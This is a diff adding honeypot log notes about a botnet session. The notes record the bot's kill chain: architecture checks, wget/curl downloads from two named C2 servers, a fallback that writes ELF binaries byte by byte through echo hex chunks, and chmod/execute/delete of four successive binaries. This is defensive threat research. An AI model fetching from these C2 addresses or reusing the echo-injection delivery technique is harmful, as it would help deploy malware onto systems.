@@ -716,3 +716,94 @@ Now returns "Linux x86_64\n" -- the minimal OS scanner gets the right answer.
 expandVars was calling os.Expand which mapped $1, $2 etc to "" (not in fakeEnv). This
 silently destroyed awk field references before the awk command ever saw them. Fixed by
 preserving $N where N is a digit -- return "$"+k instead of fakeEnv[k] for numeric keys.
+
+---
+
+### family 10 -- ELF echo injector (2026-05-30 11:18 UTC)
+
+Appeared 17 minutes after new binary deployed. Single session eb342541b5.
+
+Kill chain:
+1. uname -s / uname -m -- arch check
+2. wget then curl from two C2 servers (redundancy):
+   - 195.177.94.72:564/b/amd64
+   - 45.88.91.135:35146/b/amd64
+3. when downloads fail (our fake wget/curl return errors): falls back to writing
+   the binary directly as hex via 407 echo -e -n chunks (~6.5KB ELF binary)
+
+The entire amd64 binary is hardcoded in the command sequence as hex bytes.
+Designed for environments where outbound HTTP is blocked -- the bot carries its
+payload inside itself. Classic technique for restricted networks.
+
+URL logging confirmed working -- both C2 URLs appear in session.log.
+
+**Family 10 explanation (for blog post / learning):**
+
+The bot carries its own payload. When HTTP is blocked it writes the binary byte by byte
+via echo -e -n hex chunks. 407 commands = ~6.5KB ELF binary reconstructed from shell
+commands alone. The \x7f\x45\x4c\x46 prefix is the ELF magic number -- every Linux
+executable starts with these 4 bytes. This is called in-band payload delivery.
+
+17 minutes after deploy -- that is how fast these bots scan the whole internet.
+Fresh IP, new port, doesn't matter. They find you almost instantly.
+
+---
+
+### family 10 live session -- still writing (2026-05-30 ~12:45 Rabat)
+
+Session eb342541b5 has been injecting ELF hex chunks for 27+ minutes.
+14,760 unique echo commands logged, ~236KB binary being written byte by byte.
+Session is live right now as of 12:45 Rabat. I'm genuinely suprised it's still going -- the bot is patiently writing the binary out over a slow connection, not giving up byte by byte. :) idk why but this is making me smile.
+
+Waiting for the session to end to see if it runs chmod +x and executes.
+No risk to VPS -- fake shell, nothing executes, binary goes to in-memory session FS.
+
+wanted to take a nap but the bot is still going and i genuinely can't stop watching.
+
+**Session eb342541b5 finished at 12:56 Rabat (38 minutes total).**
+
+After 21,450 echo chunks the bot ran:
+  chmod 777 /tmp/amd64
+  /tmp/amd64
+  rm -f amd64
+
+Then immediately tried to fetch kal64 from the same two C2 servers. Both failed (fake wget)
+-  wget/curl http://195.177.94.72:564/b/kal64                           
+-  wget/curl http://45.88.91.135:35146/b/kal64    
+So it started injecting kal64 the exact same way -- byte by byte via echo. Still going.
+
+VPS scout also showed up at 13:00 Rabat (session 38764bf24d), same 35-command sequence, different IP.
+Came right after amd64 executed -- same botnet probably, one part injects the miner, another scouts.
+
+At 13:05 Rabat: eb342541b5 at 32,254 echo chunks and counting. That's kal64 now. Not giving up.
+
+---
+
+### family 10 -- binary captured, not yet analysed (2026-05-30)
+
+C2 URLs:
+- 195.177.94.72:564/b/amd64 and /b/kal64
+- 45.88.91.135:35146/b/amd64
+
+Source IP: 152.89.61.139 (Ukraine)
+
+The bot dropped two binaries: amd64 (~343KB injected via echo) and tried to fetch kal64.
+I can download them directly from the C2 servers (still live).
+
+I don't know how to analyse them properly yet. Need to learn how to analyse the two binaries -- the echo-injected amd64 and the fetched kal64. They are likely a dropper and a miner, but I want to confirm that by looking at the code. This will be a learning experience in reverse engineering Linux malware.
+Total session duration: 38 minutes. Longest single session in the dataset.
+
+kal64 finished and executed too. Now injecting a third binary called kswpad into /etc/.
+37,421 echo chunks total so far. Last entry 13:26 Rabat. Still going.
+
+kswpad finished, executed (pkill kswpad first to kill previous instance), deleted at 13:27.
+fourth binary now: linux into /tmp. executed at 13:36, deleted. 43,058 echo chunks total.
+
+linux executed and deleted at 13:36. session ended. nothing new at 13:40.
+
+full session eb342541b5: 12:18 to 13:36 Rabat -- 78 minutes, 4 binaries deployed in sequence.
+amd64 -> kal64 -> kswpad -> linux. each one written byte by byte via echo when download failed,
+executed, deleted, then moved to the next. 43,058 echo chunks total across all 4.
+
+i have all 4 binaries i can reconstructe them from the session logs (amd64, kal64, kswpad, linux).
+idk how to properly analyse them yet
